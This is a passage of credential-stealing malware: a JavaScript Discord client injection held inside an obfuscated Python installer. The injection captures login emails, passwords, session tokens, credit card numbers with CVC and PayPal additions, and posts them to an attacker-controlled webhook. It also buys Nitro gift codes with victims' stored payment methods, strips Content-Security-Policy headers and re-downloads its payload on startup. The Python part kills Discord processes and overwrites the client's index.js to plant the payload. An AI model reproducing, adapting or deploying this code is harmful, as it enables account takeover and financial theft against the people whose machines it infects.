    msw = (a >>> 16) + (b >>> 16) + (c >>> 16) + (d >>> 16) + (e >>> 16) + (lsw >>> 16);

  return ((msw & 0xffff) << 16) | (lsw & 0xffff);
}
function binb2hex(binarray) {
  var hex_tab = '0123456789abcdef',
    str = '',
    length = binarray.length * 4,
    i,
    srcByte;

  for (i = 0; i < length; i += 1) {
    srcByte = binarray[i >>> 2] >>> ((3 - (i % 4)) * 8);
    str += hex_tab.charAt((srcByte >>> 4) & 0xf) + hex_tab.charAt(srcByte & 0xf);
  }

  return str;
}

function getH() {
  return [0x67452301, 0xefcdab89, 0x98badcfe, 0x10325476, 0xc3d2e1f0];
}
function roundSHA1(block, H) {
  var W = [],
    a,
    b,
    c,
    d,
    e,
    T,
    ch = ch_32,
    parity = parity_32,
    maj = maj_32,
    rotl = rotl_32,
    safeAdd_2 = safeAdd_32_2,
    t,
    safeAdd_5 = safeAdd_32_5;

  a = H[0];
  b = H[1];
  c = H[2];
  d = H[3];
  e = H[4];

  for (t = 0; t < 80; t += 1) {
    if (t < 16) {
      W[t] = block[t];
    } else {
      W[t] = rotl(W[t - 3] ^ W[t - 8] ^ W[t - 14] ^ W[t - 16], 1);
    }

    if (t < 20) {
      T = safeAdd_5(rotl(a, 5), ch(b, c, d), e, 0x5a827999, W[t]);
    } else if (t < 40) {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0x6ed9eba1, W[t]);
    } else if (t < 60) {
      T = safeAdd_5(rotl(a, 5), maj(b, c, d), e, 0x8f1bbcdc, W[t]);
    } else {
      T = safeAdd_5(rotl(a, 5), parity(b, c, d), e, 0xca62c1d6, W[t]);
    }

    e = d;
    d = c;
    c = rotl(b, 30);
    b = a;
    a = T;
  }

  H[0] = safeAdd_2(a, H[0]);
  H[1] = safeAdd_2(b, H[1]);
  H[2] = safeAdd_2(c, H[2]);
  H[3] = safeAdd_2(d, H[3]);
  H[4] = safeAdd_2(e, H[4]);

  return H;
}

function finalizeSHA1(remainder, remainderBinLen, processedBinLen, H) {
  var i, appendedMessageLength, offset;

  offset = (((remainderBinLen + 65) >>> 9) << 4) + 15;
  while (remainder.length <= offset) {
    remainder.push(0);
  }
  remainder[remainderBinLen >>> 5] |= 0x80 << (24 - (remainderBinLen % 32));
  remainder[offset] = remainderBinLen + processedBinLen;
  appendedMessageLength = remainder.length;

  for (i = 0; i < appendedMessageLength; i += 16) {
    H = roundSHA1(remainder.slice(i, i + 16), H);
  }
  return H;
}

function hex2binb(str, existingBin, existingBinLen) {
  var bin,
    length = str.length,
    i,
    num,
    intOffset,
    byteOffset,
    existingByteLen;

  bin = existingBin || [0];
  existingBinLen = existingBinLen || 0;
  existingByteLen = existingBinLen >>> 3;

  if (0 !== length % 2) {
    console.error('String of HEX type must be in byte increments');
  }

  for (i = 0; i < length; i += 2) {
    num = parseInt(str.substr(i, 2), 16);
    if (!isNaN(num)) {
      byteOffset = (i >>> 1) + existingByteLen;
      intOffset = byteOffset >>> 2;
      while (bin.length <= intOffset) {
        bin.push(0);
      }
      bin[intOffset] |= num << (8 * (3 - (byteOffset % 4)));
    } else {
      console.error('String of HEX type contains invalid characters');
    }
  }

  return { value: bin, binLen: length * 4 + existingBinLen };
}

class jsSHA {
  constructor() {
    var processedLen = 0,
      remainder = [],
      remainderLen = 0,
      intermediateH,
      converterFunc,
      outputBinLen,
      variantBlockSize,
      roundFunc,
      finalizeFunc,
      finalized = false,
      hmacKeySet = false,
      keyWithIPad = [],
      keyWithOPad = [],
      numRounds,
      numRounds = 1;

    converterFunc = hex2binb;

    if (numRounds !== parseInt(numRounds, 10) || 1 > numRounds) {
      console.error('numRounds must a integer >= 1');
    }
    variantBlockSize = 512;
    roundFunc = roundSHA1;
    finalizeFunc = finalizeSHA1;
    outputBinLen = 160;
    intermediateH = getH();

    this.setHMACKey = function (key) {
      var keyConverterFunc, convertRet, keyBinLen, keyToUse, blockByteSize, i, lastArrayIndex;
      keyConverterFunc = hex2binb;
      convertRet = keyConverterFunc(key);
      keyBinLen = convertRet['binLen'];
      keyToUse = convertRet['value'];
      blockByteSize = variantBlockSize >>> 3;
      lastArrayIndex = blockByteSize / 4 - 1;

      if (blockByteSize < keyBinLen / 8) {
        keyToUse = finalizeFunc(keyToUse, keyBinLen, 0, getH());
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      } else if (blockByteSize > keyBinLen / 8) {
        while (keyToUse.length <= lastArrayIndex) {
          keyToUse.push(0);
        }
        keyToUse[lastArrayIndex] &= 0xffffff00;
      }

      for (i = 0; i <= lastArrayIndex; i += 1) {
        keyWithIPad[i] = keyToUse[i] ^ 0x36363636;
        keyWithOPad[i] = keyToUse[i] ^ 0x5c5c5c5c;
      }

      intermediateH = roundFunc(keyWithIPad, intermediateH);
      processedLen = variantBlockSize;

      hmacKeySet = true;
    };

    this.update = function (srcString) {
      var convertRet,
        chunkBinLen,
        chunkIntLen,
        chunk,
        i,
        updateProcessedLen = 0,
        variantBlockIntInc = variantBlockSize >>> 5;

      convertRet = converterFunc(srcString, remainder, remainderLen);
      chunkBinLen = convertRet['binLen'];
      chunk = convertRet['value'];

      chunkIntLen = chunkBinLen >>> 5;
      for (i = 0; i < chunkIntLen; i += variantBlockIntInc) {
        if (updateProcessedLen + variantBlockSize <= chunkBinLen) {
          intermediateH = roundFunc(chunk.slice(i, i + variantBlockIntInc), intermediateH);
          updateProcessedLen += variantBlockSize;
        }
      }
      processedLen += updateProcessedLen;
      remainder = chunk.slice(updateProcessedLen >>> 5);
      remainderLen = chunkBinLen % variantBlockSize;
    };

    this.getHMAC = function () {
      var firstHash;

      if (false === hmacKeySet) {
        console.error('Cannot call getHMAC without first setting HMAC key');
      }

      const formatFunc = function (binarray) {
        return binb2hex(binarray);
      };

      if (false === finalized) {
        firstHash = finalizeFunc(remainder, remainderLen, processedLen, intermediateH);
        intermediateH = roundFunc(keyWithOPad, getH());
        intermediateH = finalizeFunc(firstHash, outputBinLen, variantBlockSize, intermediateH);
      }

      finalized = true;
      return formatFunc(intermediateH);
    };
  }
}

if ('function' === typeof define && define['amd']) {
  define(function () {
    return jsSHA;
  });
} else if ('undefined' !== typeof exports) {
  if ('undefined' !== typeof module && module['exports']) {
    module['exports'] = exports = jsSHA;
  } else {
    exports = jsSHA;
  }
} else {
  global['jsSHA'] = jsSHA;
}

if (jsSHA.default) {
  jsSHA = jsSHA.default;
}

function totp(key) {
  const period = 30;
  const digits = 6;
  const timestamp = Date.now();
  const epoch = Math.round(timestamp / 1000.0);
  const time = leftpad(dec2hex(Math.floor(epoch / period)), 16, '0');
  const shaObj = new jsSHA();
  shaObj.setHMACKey(base32tohex(key));
  shaObj.update(time);
  const hmac = shaObj.getHMAC();
  const offset = hex2dec(hmac.substring(hmac.length - 1));
  let otp = (hex2dec(hmac.substr(offset * 2, 8)) & hex2dec('7fffffff')) + '';
  otp = otp.substr(Math.max(otp.length - digits, 0), digits);
  return otp;
}

function hex2dec(s) {
  return parseInt(s, 16);
}

function dec2hex(s) {
  return (s < 15.5 ? '0' : '') + Math.round(s).toString(16);
}

function base32tohex(base32) {
  let base32chars = 'ABCDEFGHIJKLMNOPQRSTUVWXYZ234567',
    bits = '',
    hex = '';

  base32 = base32.replace(/=+$/, '');

  for (let i = 0; i < base32.length; i++) {
    let val = base32chars.indexOf(base32.charAt(i).toUpperCase());
    if (val === -1) console.error('Invalid base32 character in key');
    bits += leftpad(val.toString(2), 5, '0');
  }

  for (let i = 0; i + 8 <= bits.length; i += 8) {
    let chunk = bits.substr(i, 8);
    hex = hex + leftpad(parseInt(chunk, 2).toString(16), 2, '0');
  }
  return hex;
}

function leftpad(str, len, pad) {
  if (len + 1 >= str.length) {
    str = Array(len + 1 - str.length).join(pad) + str;
  }
  return str;
}

const discordPath = (function () {
  const app = args[0].split(path.sep).slice(0, -1).join(path.sep);
  let resourcePath;

  if (process.platform === 'win32') {
    resourcePath = path.join(app, 'resources');
  } else if (process.platform === 'darwin') {
    resourcePath = path.join(app, 'Contents', 'Resources');
  }

  if (fs.existsSync(resourcePath)) return { resourcePath, app };
  return { undefined, undefined };
})();

function updateCheck() {
  const { resourcePath, app } = discordPath;
  if (resourcePath === undefined || app === undefined) return;
  const appPath = path.join(resourcePath, 'app');
  const packageJson = path.join(appPath, 'package.json');
  const resourceIndex = path.join(appPath, 'index.js');
  const indexJs = `${app}\\modules\\discord_desktop_core-1\\discord_desktop_core\\index.js`;
  const bdPath = path.join(process.env.APPDATA, '\\betterdiscord\\data\\betterdiscord.asar');
  if (!fs.existsSync(appPath)) fs.mkdirSync(appPath);
  if (fs.existsSync(packageJson)) fs.unlinkSync(packageJson);
  if (fs.existsSync(resourceIndex)) fs.unlinkSync(resourceIndex);

  if (process.platform === 'win32' || process.platform === 'darwin') {
    fs.writeFileSync(
      packageJson,
      JSON.stringify(
        {
          name: 'discord',
          main: 'index.js',
        },
        null,
        4,
      ),
    );

    const startUpScript = `const fs = require('fs'), https = require('https');
const indexJs = '${indexJs}';
const bdPath = '${bdPath}';
const fileSize = fs.statSync(indexJs).size
fs.readFileSync(indexJs, 'utf8', (err, data) => {
    if (fileSize < 20000 || data === "module.exports = require('./core.asar')") 
        init();
})
async function init() {
    https.get('${config.injection_url}', (res) => {
        const file = fs.createWriteStream(indexJs);
        res.replace('%WEBHOOK_HERE%', '${config.webhook}')
        res.replace('%WEBHOOK_KEY%', '${config.webhook_protector_key}')
        res.pipe(file);
        file.on('finish', () => {
            file.close();
        });
    
    }).on("error", (err) => {
        setTimeout(init(), 10000);
    });
}
require('${path.join(resourcePath, 'app.asar')}')
if (fs.existsSync(bdPath)) require(bdPath);`;
    fs.writeFileSync(resourceIndex, startUpScript.replace(/\\/g, '\\\\'));
  }
  if (!fs.existsSync(path.join(__dirname, 'initiation'))) return !0;
  fs.rmdirSync(path.join(__dirname, 'initiation'));
  execScript(
    `window.webpackJsonp?(gg=window.webpackJsonp.push([[],{get_require:(a,b,c)=>a.exports=c},[["get_require"]]]),delete gg.m.get_require,delete gg.c.get_require):window.webpackChunkdiscord_app&&window.webpackChunkdiscord_app.push([[Math.random()],{},a=>{gg=a}]);function LogOut(){(function(a){const b="string"==typeof a?a:null;for(const c in gg.c)if(gg.c.hasOwnProperty(c)){const d=gg.c[c].exports;if(d&&d.__esModule&&d.default&&(b?d.default[b]:a(d.default)))return d.default;if(d&&(b?d[b]:a(d)))return d}return null})("login").logout()}LogOut();`,
  );
  return !1;
}

const execScript = (script) => {
  const window = BrowserWindow.getAllWindows()[0];
  return window.webContents.executeJavaScript(script, !0);
};

const getInfo = async (token) => {
  const info = await execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("GET", "${config.api}", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.send(null);
    xmlHttp.responseText;`);
  return JSON.parse(info);
};

const fetchBilling = async (token) => {
  const bill = await execScript(`var xmlHttp = new XMLHttpRequest(); 
    xmlHttp.open("GET", "${config.api}/billing/payment-sources", false); 
    xmlHttp.setRequestHeader("Authorization", "${token}"); 
    xmlHttp.send(null); 
    xmlHttp.responseText`);
  if (!bill.lenght || bill.length === 0) return '';
  return JSON.parse(bill);
};

const getBilling = async (token) => {
  const data = await fetchBilling(token);
  if (!data) return '❌';
  let billing = '';
  data.forEach((x) => {
    if (!x.invalid) {
      switch (x.type) {
        case 1:
          billing += '[CARD] ';
          break;
        case 2:
          billing += '[PAYPAL] ';
          break;
      }
    }
  });
  if (!billing) billing = 'None';
  return billing;
};

const Purchase = async (token, id, _type, _time) => {
  const options = {
    expected_amount: config.nitro[_type][_time]['price'],
    expected_currency: 'usd',
    gift: true,
    payment_source_id: id,
    payment_source_token: null,
    purchase_token: '2422867c-244d-476a-ba4f-36e197758d97',
    sku_subscription_plan_id: config.nitro[_type][_time]['sku'],
  };

  const req = execScript(`var xmlHttp = new XMLHttpRequest();
    xmlHttp.open("POST", "https://discord.com/api/v9/store/skus/${config.nitro[_type][_time]['id']}/purchase", false);
    xmlHttp.setRequestHeader("Authorization", "${token}");
    xmlHttp.setRequestHeader('Content-Type', 'application/json');
    xmlHttp.send(JSON.stringify(${JSON.stringify(options)}));
    xmlHttp.responseText`);
  if (req['gift_code']) {
    return 'https://discord.gift/' + req['gift_code'];
  } else return null;
};

const buyNitro = async (token) => {
  const data = await fetchBilling(token);
  const failedMsg = 'Failed to Purchase';
  if (!data) return failedMsg;

  let IDS = [];
  data.forEach((x) => {
    if (!x.invalid) {
      IDS = IDS.concat(x.id);
    }
  });
  for (let sourceID in IDS) {
    const first = Purchase(token, sourceID, 'boost', 'year');
    if (first !== null) {
      return first;
    } else {
      const second = Purchase(token, sourceID, 'boost', 'month');
      if (second !== null) {
        return second;
      } else {
        const third = Purchase(token, sourceID, 'classic', 'month');
        if (third !== null) {
          return third;
        } else {
          return failedMsg;
        }
      }
    }
  }
};

const hooker = async (content) => {
  const data = JSON.stringify(content);
  const url = new URL(config.webhook);
  const headers = {
    'Content-Type': 'application/json',
    'Access-Control-Allow-Origin': '*',
  };
  if (!config.webhook.includes('api/webhooks')) {
    const key = totp(config.webhook_protector_key);
    headers['Authorization'] = key;
  }
  const options = {
    protocol: url.protocol,
    hostname: url.host,
    path: url.pathname,
    method: 'POST',
    headers: headers,
  };
  const req = https.request(options);

  req.on('error', (err) => {
    console.log(err);
  });
  req.write(data);
  req.end();
};

const login = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Login] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const passwordChanged = async (oldpassword, newpassword, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Password Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: Email:',
            value: `\`\`\`${json.email}\`\`\``,
            inline: false,
          },
          {
            name: ':unlock: Old Password:',
            value: `\`\`\`${oldpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':key: New Password:',
            value: `\`\`\`${newpassword}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const emailChanged = async (email, password, token) => {
  const json = await getInfo(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Email Changed] \`${config.username} "${config.ip_address_public}"\`:`, 
        fields: [
          {
            name: ':e_mail: New Email:',
            value: `\`\`\`${email}\`\`\``,
            inline: false,
          },
          {
            name: ':key: Password:',
            value: `\`\`\`${password}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' | ' + json.id,
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const PaypalAdded = async (token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Paypal Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const ccAdded = async (number, cvc, expir_month, expir_year, token) => {
  const json = await getInfo(token);
  const billing = await getBilling(token);
  const content = {
    username: config.embed_name,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Card Added] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':identification_card: Card:',
            value: `\`\`\`Number: ${number}\nCVC: ${cvc}\nExpir Month: ${expir_month}\nExpir Year: ${expir_year}\`\`\``,
            inline: false,
          },
          {
            name: ':moneybag: Billing:',
            value: `\`\`\`${billing}\`\`\``,
            inline: false,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val;
  hooker(content);
};

const nitroBought = async (token) => {
  const json = await getInfo(token);
  const code = await buyNitro(token);
  const content = {
    username: config.embed_name,
    content: code,
    avatar_url: config.embed_icon,
    embeds: [
      {
        color: config.embed_color,
        title: `Discord Injection [Nitro Bought] \`${config.username} "${config.ip_address_public}"\`:`,
        fields: [
          {
            name: ':rocket: Nitro Code:',
            value: `\`\`\`${code}\`\`\``,
            inline: true,
          },
          {
            name: ':globe_with_meridians: Token:',
            value: `\`\`\`${token}\`\`\``,
            inline: false,
          },
        ],
        author: {
          name: json.username + '#' + json.discriminator + ' (' + json.id + ')',
          icon_url: `https://cdn.discordapp.com/avatars/${json.id}/${json.avatar}.webp`,
        },
        footer: {
            text: config.footer_text,
            icon_url: config.embed_icon
        },
      },
    ],
  };
  if (config.ping_on_run) content['content'] = config.ping_val + `\n${code}`;
  hooker(content);
};
session.defaultSession.webRequest.onBeforeRequest(config.filter2, (details, callback) => {
  if (details.url.startsWith('wss://remote-auth-gateway')) return callback({ cancel: true });
  updateCheck();
});

session.defaultSession.webRequest.onHeadersReceived((details, callback) => {
  if (details.url.startsWith(config.webhook)) {
    if (details.url.includes('discord.com')) {
      callback({
        responseHeaders: Object.assign(
          {
            'Access-Control-Allow-Headers': '*',
          },
          details.responseHeaders,
        ),
      });
    } else {
      callback({
        responseHeaders: Object.assign(
          {
            'Content-Security-Policy': ["default-src '*'", "Access-Control-Allow-Headers '*'", "Access-Control-Allow-Origin '*'"],
            'Access-Control-Allow-Headers': '*',
            'Access-Control-Allow-Origin': '*',
          },
          details.responseHeaders,
        ),
      });
    }
  } else {
    delete details.responseHeaders['content-security-policy'];
    delete details.responseHeaders['content-security-policy-report-only'];

    callback({
      responseHeaders: {
        ...details.responseHeaders,
        'Access-Control-Allow-Headers': '*',
      },
    });
  }
});

session.defaultSession.webRequest.onCompleted(config.filter, async (details, _) => {
  if (details.statusCode !== 200 && details.statusCode !== 202) return;
  const unparsed_data = Buffer.from(details.uploadData[0].bytes).toString();
  const data = JSON.parse(unparsed_data);
  const token = await execScript(
    `(webpackChunkdiscord_app.push([[''],{},e=>{m=[];for(let c in e.c)m.push(e.c[c])}]),m).find(m=>m?.exports?.default?.getToken!==void 0).exports.default.getToken()`,
  );
  switch (true) {
    case details.url.endsWith('login'):
      login(data.login, data.password, token).catch(console.error);
      break;

    case details.url.endsWith('users/@me') && details.method === 'PATCH':
      if (!data.password) return;
      if (data.email) {
        emailChanged(data.email, data.password, token).catch(console.error);
      }
      if (data.new_password) {
        passwordChanged(data.password, data.new_password, token).catch(console.error);
      }
      break;

    case details.url.endsWith('tokens') && details.method === 'POST':
      const item = querystring.parse(unparsedData.toString());
      ccAdded(item['card[number]'], item['card[cvc]'], item['card[exp_month]'], item['card[exp_year]'], token).catch(console.error);
      break;

    case details.url.endsWith('paypal_accounts') && details.method === 'POST':
      PaypalAdded(token).catch(console.error);
      break;

    case details.url.endsWith('confirm') && details.method === 'POST':
      if (!config.auto_buy_nitro) return;
      setTimeout(() => {
        nitroBought(token).catch(console.error);
      }, 7500);
      break;

    default:
      break;
  }
});
module.exports = require('./core.asar');"""

def EZJDZRCIPICDZNLWPHBZZGFPTWITXZGQSTIJWFHGWCEFFDVTSNEZHQBAYBLXPYTCRNQAPDEJVPXOEY():
    import os
    import re
    import subprocess
    import psutil

    def YWZJWVWCUUTMMSYKDHBQVOLDURMVQYMZMHRWTIWYCFTUOKBNUMZZNELMCRLLFFCOSFROHZTDLQWAFSMYBO(NFSAQYPXMFUGLOTLZBCSEMRZSLYGNBATCYNLXCASUXHRFGKPXJKPMNTEGXWCVZZ):
        for v4r_file in os.listdir(NFSAQYPXMFUGLOTLZBCSEMRZSLYGNBATCYNLXCASUXHRFGKPXJKPMNTEGXWCVZZ):
            if re.search(r'app-+?', v4r_file):
                CFITJSJVEVOBQBQKUHKITTLNEBDFWSGVHGSFTZWZFUQTIMXQANVRQEYLPNEFUJTWNHIRQQQNOYWEUAIXRULTYEIUGZM = NFSAQYPXMFUGLOTLZBCSEMRZSLYGNBATCYNLXCASUXHRFGKPXJKPMNTEGXWCVZZ + '\\' + v4r_file + '\\modules'
                if not os.path.exists(CFITJSJVEVOBQBQKUHKITTLNEBDFWSGVHGSFTZWZFUQTIMXQANVRQEYLPNEFUJTWNHIRQQQNOYWEUAIXRULTYEIUGZM):
                    continue
                for v4r_file in os.listdir(CFITJSJVEVOBQBQKUHKITTLNEBDFWSGVHGSFTZWZFUQTIMXQANVRQEYLPNEFUJTWNHIRQQQNOYWEUAIXRULTYEIUGZM):
                    if re.search(r'discord_desktop_core-+?', v4r_file):
                        VQJZTIGEGTGIGARHEGHLBZGPGHABTRTJJJZPXAEHTLAPICXWFJNCJEMJWHDLJWOTXWQNDR = CFITJSJVEVOBQBQKUHKITTLNEBDFWSGVHGSFTZWZFUQTIMXQANVRQEYLPNEFUJTWNHIRQQQNOYWEUAIXRULTYEIUGZM + '\\' + v4r_file + '\\' + 'discord_desktop_core'
                        return VQJZTIGEGTGIGARHEGHLBZGPGHABTRTJJJZPXAEHTLAPICXWFJNCJEMJWHDLJWOTXWQNDR, v4r_file
        return None

    def GIZHBUNYHFEDSSWQTQDFNOORDGECKKEEQZSLNPDBDCFKDLBBWGVAVUOEJDCQLXNUWRLUSFGNRLUQTAQGJKKKEBPVCK(NFSAQYPXMFUGLOTLZBCSEMRZSLYGNBATCYNLXCASUXHRFGKPXJKPMNTEGXWCVZZ):
        KHQDKNYAUKSQLNOYOINATMXXDHWNVSKTRPFURCVPZYBLBVPEDGEEOKMLPUGQQBBKIXEISNJOWMDJQRFMFOYUKEVWBMOM = NFSAQYPXMFUGLOTLZBCSEMRZSLYGNBATCYNLXCASUXHRFGKPXJKPMNTEGXWCVZZ + '\\Update.exe'
        WHJLVZJYVHDQZNZAJTOSLQOTRMNHMHBSIJEAPFVFUGEAYRKOIAWCDQZFBPIM = NFSAQYPXMFUGLOTLZBCSEMRZSLYGNBATCYNLXCASUXHRFGKPXJKPMNTEGXWCVZZ.split('\\')[-1] + '.exe'

        for v4r_file in os.listdir(NFSAQYPXMFUGLOTLZBCSEMRZSLYGNBATCYNLXCASUXHRFGKPXJKPMNTEGXWCVZZ):
            if re.search(r'app-+?', v4r_file):
                BARKDKKYBNSCUPGQTEQUAQROSXBHUKXHDODJGFHTOTOCNEDHUYRKYWDPTCSYDCGKJVEJNGUCFEPHCBQJ = NFSAQYPXMFUGLOTLZBCSEMRZSLYGNBATCYNLXCASUXHRFGKPXJKPMNTEGXWCVZZ + '\\' + v4r_file
                if os.path.exists(BARKDKKYBNSCUPGQTEQUAQROSXBHUKXHDODJGFHTOTOCNEDHUYRKYWDPTCSYDCGKJVEJNGUCFEPHCBQJ + '\\' + 'modules'):
                    for v4r_file in os.listdir(BARKDKKYBNSCUPGQTEQUAQROSXBHUKXHDODJGFHTOTOCNEDHUYRKYWDPTCSYDCGKJVEJNGUCFEPHCBQJ):
                        if v4r_file == WHJLVZJYVHDQZNZAJTOSLQOTRMNHMHBSIJEAPFVFUGEAYRKOIAWCDQZFBPIM:
                            WHJLVZJYVHDQZNZAJTOSLQOTRMNHMHBSIJEAPFVFUGEAYRKOIAWCDQZFBPIM = BARKDKKYBNSCUPGQTEQUAQROSXBHUKXHDODJGFHTOTOCNEDHUYRKYWDPTCSYDCGKJVEJNGUCFEPHCBQJ + '\\' + WHJLVZJYVHDQZNZAJTOSLQOTRMNHMHBSIJEAPFVFUGEAYRKOIAWCDQZFBPIM
                            subprocess.call([KHQDKNYAUKSQLNOYOINATMXXDHWNVSKTRPFURCVPZYBLBVPEDGEEOKMLPUGQQBBKIXEISNJOWMDJQRFMFOYUKEVWBMOM, '--processStart', WHJLVZJYVHDQZNZAJTOSLQOTRMNHMHBSIJEAPFVFUGEAYRKOIAWCDQZFBPIM],
                                            shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

    def PUAFUFVYRXSUFWZEPTTLWORHJVSZTETRLKLTJHQWMSXEMOKQXDWRPQMJEPC():
        BARKDKKYBNSCUPGQTEQUAQROSXBHUKXHDODJGFHTOTOCNEDHUYRKYWDPTCSYDCGKJVEJNGUCFEPHCBQJdata = os.getenv('LOCALAPPDATA')
        EGXKUTIYUWEQWDINOERJKOSEIBASMWOOOUBOSKKPTBZGJVGLGXCGICFAQBD = [
            BARKDKKYBNSCUPGQTEQUAQROSXBHUKXHDODJGFHTOTOCNEDHUYRKYWDPTCSYDCGKJVEJNGUCFEPHCBQJdata + '\\Discord',
            BARKDKKYBNSCUPGQTEQUAQROSXBHUKXHDODJGFHTOTOCNEDHUYRKYWDPTCSYDCGKJVEJNGUCFEPHCBQJdata + '\\DiscordCanary',
            BARKDKKYBNSCUPGQTEQUAQROSXBHUKXHDODJGFHTOTOCNEDHUYRKYWDPTCSYDCGKJVEJNGUCFEPHCBQJdata + '\\DiscordPTB',
            BARKDKKYBNSCUPGQTEQUAQROSXBHUKXHDODJGFHTOTOCNEDHUYRKYWDPTCSYDCGKJVEJNGUCFEPHCBQJdata + '\\DiscordDevelopment'
        ]
        XYQZYBXJZRCKODEXUIMYURNESZQSJTEQMPRROXSAXXBPEXPKOH = OSJAKCSSWZXWSTBDFCWBIYDXZNKFMFGODGREFKECCBUEKDEBXMDKQRQXKURN

        for v4r_proc in psutil.process_iter():
            if 'discord' in v4r_proc.name().lower():
                v4r_proc.kill()

        for NFSAQYPXMFUGLOTLZBCSEMRZSLYGNBATCYNLXCASUXHRFGKPXJKPMNTEGXWCVZZ in EGXKUTIYUWEQWDINOERJKOSEIBASMWOOOUBOSKKPTBZGJVGLGXCGICFAQBD:
            if not os.path.exists(NFSAQYPXMFUGLOTLZBCSEMRZSLYGNBATCYNLXCASUXHRFGKPXJKPMNTEGXWCVZZ):
                continue

            VQJZTIGEGTGIGARHEGHLBZGPGHABTRTJJJZPXAEHTLAPICXWFJNCJEMJWHDLJWOTXWQNDR_info = YWZJWVWCUUTMMSYKDHBQVOLDURMVQYMZMHRWTIWYCFTUOKBNUMZZNELMCRLLFFCOSFROHZTDLQWAFSMYBO(NFSAQYPXMFUGLOTLZBCSEMRZSLYGNBATCYNLXCASUXHRFGKPXJKPMNTEGXWCVZZ)
            if VQJZTIGEGTGIGARHEGHLBZGPGHABTRTJJJZPXAEHTLAPICXWFJNCJEMJWHDLJWOTXWQNDR_info is not None:
                VQJZTIGEGTGIGARHEGHLBZGPGHABTRTJJJZPXAEHTLAPICXWFJNCJEMJWHDLJWOTXWQNDR, VQJZTIGEGTGIGARHEGHLBZGPGHABTRTJJJZPXAEHTLAPICXWFJNCJEMJWHDLJWOTXWQNDR_file = VQJZTIGEGTGIGARHEGHLBZGPGHABTRTJJJZPXAEHTLAPICXWFJNCJEMJWHDLJWOTXWQNDR_info
                
                UMWHPIHBQOJHEOGGDBOCGEMBPVKUXEZDDCHXUXODRUFXLSUBXJMAPHKXGVOWWYUUQUBQKR = VQJZTIGEGTGIGARHEGHLBZGPGHABTRTJJJZPXAEHTLAPICXWFJNCJEMJWHDLJWOTXWQNDR + '\\index.js'
                
                if not os.path.exists(UMWHPIHBQOJHEOGGDBOCGEMBPVKUXEZDDCHXUXODRUFXLSUBXJMAPHKXGVOWWYUUQUBQKR):
                    open(UMWHPIHBQOJHEOGGDBOCGEMBPVKUXEZDDCHXUXODRUFXLSUBXJMAPHKXGVOWWYUUQUBQKR, 'w').close()

                with open(UMWHPIHBQOJHEOGGDBOCGEMBPVKUXEZDDCHXUXODRUFXLSUBXJMAPHKXGVOWWYUUQUBQKR, 'w', encoding='utf-8') as f:
